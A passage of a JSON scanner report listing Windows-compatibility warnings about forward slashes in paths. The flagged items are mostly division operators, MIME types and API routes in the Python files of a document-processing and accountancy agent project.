        "warning": "Line 568: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.330765"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\xero_integration.py",
        "warning": "Line 680: Forward slash in path - \", 0) / quantity\n                \n                items.append(XeroLineItem(\n                    description=item.get(\"",
        "timestamp": "2025-09-05T17:30:42.330900"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 65: Forward slash in path - \"POST:/api/v1/documents/process\"",
        "timestamp": "2025-09-05T17:30:42.331429"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 66: Forward slash in path - \"POST:/api/v1/documents/batch\"",
        "timestamp": "2025-09-05T17:30:42.331441"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 67: Forward slash in path - \"POST:/api/v1/documents/upload\"",
        "timestamp": "2025-09-05T17:30:42.331449"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 68: Forward slash in path - \"GET:/api/v1/analytics/processing\"",
        "timestamp": "2025-09-05T17:30:42.331457"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 69: Forward slash in path - \"POST:/auth/login\"",
        "timestamp": "2025-09-05T17:30:42.331466"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 70: Forward slash in path - \"POST:/auth/refresh\"",
        "timestamp": "2025-09-05T17:30:42.331474"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 127: Forward slash in path - \"] - 1) + processing_time) /\n                self.metrics[\"",
        "timestamp": "2025-09-05T17:30:42.331531"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 234: Forward slash in path - \"global:minute:{int(current_time // 60)}\"",
        "timestamp": "2025-09-05T17:30:42.331641"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 235: Forward slash in path - \"global:hour:{int(current_time // 3600)}\"",
        "timestamp": "2025-09-05T17:30:42.331655"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 245: Forward slash in path - \": int((current_time // 60 + 1) * 60),\n                \"",
        "timestamp": "2025-09-05T17:30:42.331677"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 257: Forward slash in path - \": int((current_time // 3600 + 1) * 3600),\n                \"",
        "timestamp": "2025-09-05T17:30:42.331701"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 267: Forward slash in path - \": int((current_time // 60 + 1) * 60)\n        }\n    \n    async def _check_user_limits(self, identifiers: Dict[str, Any], current_time: float) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.331725"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 280: Forward slash in path - \"user:{user_id}:minute:{int(current_time // 60)}\"",
        "timestamp": "2025-09-05T17:30:42.331749"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 281: Forward slash in path - \"user:{user_id}:hour:{int(current_time // 3600)}\"",
        "timestamp": "2025-09-05T17:30:42.331763"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 282: Forward slash in path - \"user:{user_id}:day:{int(current_time // 86400)}\"",
        "timestamp": "2025-09-05T17:30:42.331776"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 295: Forward slash in path - \": int((current_time // 60 + 1) * 60),\n                \"",
        "timestamp": "2025-09-05T17:30:42.331798"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 305: Forward slash in path - \": int((current_time // 3600 + 1) * 3600),\n                \"",
        "timestamp": "2025-09-05T17:30:42.331822"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 315: Forward slash in path - \": int((current_time // 86400 + 1) * 86400),\n                \"",
        "timestamp": "2025-09-05T17:30:42.331846"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 326: Forward slash in path - \": int((current_time // 60 + 1) * 60)\n        }\n    \n    async def _check_organization_limits(self, identifiers: Dict[str, Any], current_time: float) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.331874"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 338: Forward slash in path - \"org:{org_id}:minute:{int(current_time // 60)}\"",
        "timestamp": "2025-09-05T17:30:42.331899"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 339: Forward slash in path - \"org:{org_id}:hour:{int(current_time // 3600)}\"",
        "timestamp": "2025-09-05T17:30:42.331919"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 350: Forward slash in path - \": int((current_time // 60 + 1) * 60),\n                \"",
        "timestamp": "2025-09-05T17:30:42.331943"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 360: Forward slash in path - \": int((current_time // 3600 + 1) * 3600),\n                \"",
        "timestamp": "2025-09-05T17:30:42.331968"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 370: Forward slash in path - \": int((current_time // 60 + 1) * 60)\n        }\n    \n    async def _check_endpoint_limits(self, identifiers: Dict[str, Any], current_time: float) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.331995"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 380: Forward slash in path - \"endpoint:{endpoint}:minute:{int(current_time // 60)}\"",
        "timestamp": "2025-09-05T17:30:42.332020"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 390: Forward slash in path - \": int((current_time // 60 + 1) * 60),\n                \"",
        "timestamp": "2025-09-05T17:30:42.332043"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 397: Forward slash in path - \": int((current_time // 60 + 1) * 60)\n        }\n    \n    async def _check_token_bucket(self, identifiers: Dict[str, Any], current_time: float) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.332068"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 518: Forward slash in path - \"global:minute:{int(current_time // 60)}\"",
        "timestamp": "2025-09-05T17:30:42.332190"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 519: Forward slash in path - \"global:hour:{int(current_time // 3600)}\"",
        "timestamp": "2025-09-05T17:30:42.332213"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 526: Forward slash in path - \"user:{user_id}:minute:{int(current_time // 60)}\"",
        "timestamp": "2025-09-05T17:30:42.332239"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 527: Forward slash in path - \"user:{user_id}:hour:{int(current_time // 3600)}\"",
        "timestamp": "2025-09-05T17:30:42.332262"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 528: Forward slash in path - \"user:{user_id}:day:{int(current_time // 86400)}\"",
        "timestamp": "2025-09-05T17:30:42.332286"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 535: Forward slash in path - \"org:{org_id}:minute:{int(current_time // 60)}\"",
        "timestamp": "2025-09-05T17:30:42.332313"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 536: Forward slash in path - \"org:{org_id}:hour:{int(current_time // 3600)}\"",
        "timestamp": "2025-09-05T17:30:42.332337"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 542: Forward slash in path - \"endpoint:{endpoint}:minute:{int(current_time // 60)}\"",
        "timestamp": "2025-09-05T17:30:42.332364"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\rate_limiting.py",
        "warning": "Line 642: Forward slash in path - \"] / max(self.metrics[\"",
        "timestamp": "2025-09-05T17:30:42.332490"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\request_logging.py",
        "warning": "Line 1: Forward slash in path - \"\nRequest Logging Middleware\nComprehensive request/response logging with performance metrics\n\"",
        "timestamp": "2025-09-05T17:30:42.332976"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\request_logging.py",
        "warning": "Line 26: Forward slash in path - \"\n    Advanced request logging middleware providing:\n    - Structured request/response logging\n    - Performance metrics tracking\n    - Request correlation tracking\n    - Error context capture\n    - Sensitive data filtering\n    - Audit trail generation\n    - Performance alerting\n    \"",
        "timestamp": "2025-09-05T17:30:42.333000"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\request_logging.py",
        "warning": "Line 46: Forward slash in path - \"/health\"",
        "timestamp": "2025-09-05T17:30:42.333018"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\request_logging.py",
        "warning": "Line 46: Forward slash in path - \"/metrics\"",
        "timestamp": "2025-09-05T17:30:42.333025"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\request_logging.py",
        "warning": "Line 102: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.333078"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\request_logging.py",
        "warning": "Line 217: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.333164"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\request_logging.py",
        "warning": "Line 250: Forward slash in path - \"/admin/\"",
        "timestamp": "2025-09-05T17:30:42.333214"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\request_logging.py",
        "warning": "Line 288: Forward slash in path - '] // 100}xx\"",
        "timestamp": "2025-09-05T17:30:42.333259"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\request_logging.py",
        "warning": "Line 305: Forward slash in path - \"/api/v1/auth/login\"",
        "timestamp": "2025-09-05T17:30:42.333288"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\request_logging.py",
        "warning": "Line 306: Forward slash in path - \"/api/v1/auth/logout\"",
        "timestamp": "2025-09-05T17:30:42.333303"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\request_logging.py",
        "warning": "Line 307: Forward slash in path - \"/api/v1/documents/process\"",
        "timestamp": "2025-09-05T17:30:42.333318"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\request_logging.py",
        "warning": "Line 308: Forward slash in path - \"/api/v1/admin/\"",
        "timestamp": "2025-09-05T17:30:42.333333"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\request_logging.py",
        "warning": "Line 335: Forward slash in path - \"/api/v1/documents/process\"",
        "timestamp": "2025-09-05T17:30:42.333373"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\request_logging.py",
        "warning": "Line 409: Forward slash in path - \"Filter sensitive data from request/response bodies\"",
        "timestamp": "2025-09-05T17:30:42.333455"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\request_logging.py",
        "warning": "Line 439: Forward slash in path - \": 0\n            }\n        \n        # Calculate percentiles\n        sorted_times = sorted(self.request_times)\n        count = len(sorted_times)\n        \n        avg_time = sum(sorted_times) / count\n        p95_time = sorted_times[int(count * 0.95)] if count > 0 else 0\n        p99_time = sorted_times[int(count * 0.99)] if count > 0 else 0\n        \n        error_rate = (self.error_count / max(self.total_requests, 1)) * 100\n        \n        return {\n            \"",
        "timestamp": "2025-09-05T17:30:42.333510"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\security.py",
        "warning": "Line 312: Forward slash in path - \"/api/\"",
        "timestamp": "2025-09-05T17:30:42.334181"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\security.py",
        "warning": "Line 326: Forward slash in path - \"../\"",
        "timestamp": "2025-09-05T17:30:42.334210"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\middleware\\security.py",
        "warning": "Line 342: Forward slash in path - '/*\"",
        "timestamp": "2025-09-05T17:30:42.334240"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\models\\api_models.py",
        "warning": "Line 1: Forward slash in path - \"\nAPI Models for Enterprise Document Processing System\nPydantic models for request/response validation, serialization, and documentation\n\"",
        "timestamp": "2025-09-05T17:30:42.334833"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\models\\database_models.py",
        "warning": "Line 533: Forward slash in path - \"), nullable=True)\n    \n    # Event details\n    event_type = Column(String(100), nullable=False)  # login, logout, document_process, etc.\n    resource_type = Column(String(100), nullable=True)  # document, user, organization, etc.\n    resource_id = Column(String(255), nullable=True)\n    action = Column(String(100), nullable=False)  # create, read, update, delete, process\n    \n    # Request details\n    ip_address = Column(String(45), nullable=True)\n    user_agent = Column(Text, nullable=True)\n    request_id = Column(String(255), nullable=True)\n    session_id = Column(String(255), nullable=True)\n    \n    # Event outcome\n    status = Column(String(50), nullable=False)  # success, failure, warning\n    error_code = Column(String(100), nullable=True)\n    error_message = Column(Text, nullable=True)\n    \n    # Additional context\n    extra_metadata = Column(JSON, nullable=True)\n    changes = Column(JSON, nullable=True)  # Before/after values for updates\n    \n    # Relationships\n    user = relationship(\"",
        "timestamp": "2025-09-05T17:30:42.335795"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "warning": "Line 166: Forward slash in path - \": str(e)\n                    }\n                    overall_healthy = False\n            \n            # System uptime\n            uptime_seconds = (datetime.utcnow() - self.start_time).total_seconds()\n            \n            # Performance metrics\n            avg_response_time = 0.0\n            if self.response_times:\n                avg_response_time = sum(self.response_times) / len(self.response_times)\n            \n            return {\n                \"",
        "timestamp": "2025-09-05T17:30:42.336273"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "warning": "Line 474: Forward slash in path - \": memory.available // (1024 * 1024),\n                \"",
        "timestamp": "2025-09-05T17:30:42.336459"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "warning": "Line 475: Forward slash in path - \": memory.total // (1024 * 1024)\n            }\n            \n        except Exception as e:\n            return {\"",
        "timestamp": "2025-09-05T17:30:42.336479"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "warning": "Line 484: Forward slash in path - '/'",
        "timestamp": "2025-09-05T17:30:42.336497"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "warning": "Line 489: Forward slash in path - \": (disk.used / disk.total) * 100,\n                \"",
        "timestamp": "2025-09-05T17:30:42.336518"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "warning": "Line 490: Forward slash in path - \": disk.free // (1024 * 1024 * 1024),\n                \"",
        "timestamp": "2025-09-05T17:30:42.336532"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "warning": "Line 491: Forward slash in path - \": disk.total // (1024 * 1024 * 1024)\n            }\n            \n        except Exception as e:\n            return {\"",
        "timestamp": "2025-09-05T17:30:42.336546"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "warning": "Line 552: Forward slash in path - \",\n                value=process.memory_info().rss / (1024 * 1024),\n                timestamp=timestamp,\n                tags={\"",
        "timestamp": "2025-09-05T17:30:42.336613"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "warning": "Line 563: Forward slash in path - \"\n        try:\n            # Check error rate\n            total_requests = sum(1 for _ in self.response_times)\n            error_count = sum(self.error_counts.values())\n            \n            if total_requests > 100:  # Only check if we have enough data\n                error_rate = (error_count / total_requests) * 100\n                \n                if error_rate > 10:  # Alert if error rate > 10%\n                    await self.create_alert(\n                        AlertLevel.WARNING,\n                        \"",
        "timestamp": "2025-09-05T17:30:42.336640"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "warning": "Line 576: Forward slash in path - \"Error rate is {error_rate:.1f}% ({error_count}/{total_requests})\"",
        "timestamp": "2025-09-05T17:30:42.336655"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "warning": "Line 578: Forward slash in path - \": total_requests}\n                    )\n            \n            # Check response time\n            if self.response_times:\n                avg_response_time = sum(self.response_times) / len(self.response_times)\n                \n                if avg_response_time > 5.0:  # Alert if avg response time > 5s\n                    await self.create_alert(\n                        AlertLevel.WARNING,\n                        \"",
        "timestamp": "2025-09-05T17:30:42.336685"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "warning": "Line 646: Forward slash in path - \"\n        try:\n            process = psutil.Process()\n            return process.memory_info().rss / (1024 * 1024)\n        except Exception:\n            return 0.0\n    \n    def _get_cpu_usage(self) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.336745"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "warning": "Line 688: Forward slash in path - \")\n                    )\n                )\n                failed_docs = result.scalar() or 0\n                \n                success_rate = (completed_docs / max(total_docs, 1)) * 100\n                \n                return {\n                    \"",
        "timestamp": "2025-09-05T17:30:42.336793"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "warning": "Line 700: Forward slash in path - \": round(total_docs / 24, 1)\n                }\n                \n        except Exception as e:\n            logger.error(f\"",
        "timestamp": "2025-09-05T17:30:42.336821"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "warning": "Line 708: Forward slash in path - \"\n        try:\n            # Response time statistics\n            response_times = list(self.response_times)\n            if response_times:\n                avg_response_time = sum(response_times) / len(response_times)\n                sorted_times = sorted(response_times)\n                p95_time = sorted_times[int(len(sorted_times) * 0.95)]\n                p99_time = sorted_times[int(len(sorted_times) * 0.99)]\n            else:\n                avg_response_time = p95_time = p99_time = 0\n            \n            return {\n                \"",
        "timestamp": "2025-09-05T17:30:42.336848"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "warning": "Line 781: Forward slash in path - \"])\n            \n            # Calculate averages\n            confidence_scores = [d.confidence_score for d in documents if d.confidence_score is not None]\n            avg_confidence = sum(confidence_scores) / len(confidence_scores) if confidence_scores else 0\n            \n            processing_times = [d.processing_duration_ms for d in documents if d.processing_duration_ms is not None]\n            avg_processing_time = sum(processing_times) / len(processing_times) if processing_times else 0\n            \n            # Cost analysis\n            costs = [d.processing_cost for d in documents if d.processing_cost is not None]\n            total_cost = sum(costs) if costs else Decimal(\"",
        "timestamp": "2025-09-05T17:30:42.336916"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "warning": "Line 815: Forward slash in path - \": round((successful_docs / total_docs) * 100, 2),\n                    \"",
        "timestamp": "2025-09-05T17:30:42.336955"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "warning": "Line 819: Forward slash in path - \": float(total_cost / total_docs) if total_docs > 0 else 0\n                },\n                \"",
        "timestamp": "2025-09-05T17:30:42.336989"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "warning": "Line 865: Forward slash in path - \"]) / len(metrics[\"",
        "timestamp": "2025-09-05T17:30:42.337040"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\monitoring_service.py",
        "warning": "Line 869: Forward slash in path - \"]) / len(metrics[\"",
        "timestamp": "2025-09-05T17:30:42.337071"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\processing_service.py",
        "warning": "Line 761: Forward slash in path - \"\n        # Create temp file\n        temp_dir = Path(tempfile.gettempdir()) / \"",
        "timestamp": "2025-09-05T17:30:42.337928"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\processing_service.py",
        "warning": "Line 763: Forward slash in path - \"\n        temp_dir.mkdir(exist_ok=True)\n        \n        temp_file_path = temp_dir / f\"",
        "timestamp": "2025-09-05T17:30:42.337964"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\webhook_service.py",
        "warning": "Line 459: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.338582"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\webhook_service.py",
        "warning": "Line 460: Forward slash in path - \"Enterprise-Document-Processing-API/1.0\"",
        "timestamp": "2025-09-05T17:30:42.338616"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\services\\webhook_service.py",
        "warning": "Line 714: Forward slash in path - \"] / \n                self.delivery_stats[\"",
        "timestamp": "2025-09-05T17:30:42.338781"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\financial_workflow.py",
        "warning": "Line 97: Forward slash in path - \"\n    transaction_id: str\n    date: datetime\n    description: str\n    amount: Decimal\n    balance: Decimal\n    transaction_type: str  # debit/credit\n    reference: str = \"",
        "timestamp": "2025-09-05T17:30:42.339199"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\financial_workflow.py",
        "warning": "Line 152: Forward slash in path - 'date\\s*:?\\s*(\\d{1,2}[/-]\\d{1,2}[/-]\\d{2,4})'",
        "timestamp": "2025-09-05T17:30:42.339243"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\financial_workflow.py",
        "warning": "Line 153: Forward slash in path - 'invoice\\s*date\\s*:?\\s*(\\d{1,2}[/-]\\d{1,2}[/-]\\d{2,4})'",
        "timestamp": "2025-09-05T17:30:42.339255"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\financial_workflow.py",
        "warning": "Line 154: Forward slash in path - 'bill\\s*date\\s*:?\\s*(\\d{1,2}[/-]\\d{1,2}[/-]\\d{2,4})'",
        "timestamp": "2025-09-05T17:30:42.339266"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\accountancy\\financial_workflow.py",
        "warning": "Line 211: Forward slash in path - ']:\n                match = re.search(pattern, text, re.IGNORECASE)\n                if match:\n                    invoice.vendor_name = match.group(1).strip()\n                    break\n            \n            # Calculate confidence score\n            confidence_factors = [\n                1.0 if invoice.invoice_number else 0.0,\n                1.0 if invoice.total_amount > 0 else 0.0,\n                1.0 if invoice.invoice_date else 0.0,\n                1.0 if invoice.vendor_name else 0.0\n            ]\n            \n            invoice.confidence_score = sum(confidence_factors) / len(confidence_factors)\n            \n            # Store extracted data\n            invoice.extracted_data = {\n                '",
        "timestamp": "2025-09-05T17:30:42.339323"
      },
      {
        "category": "WINDOWS_COMPAT",
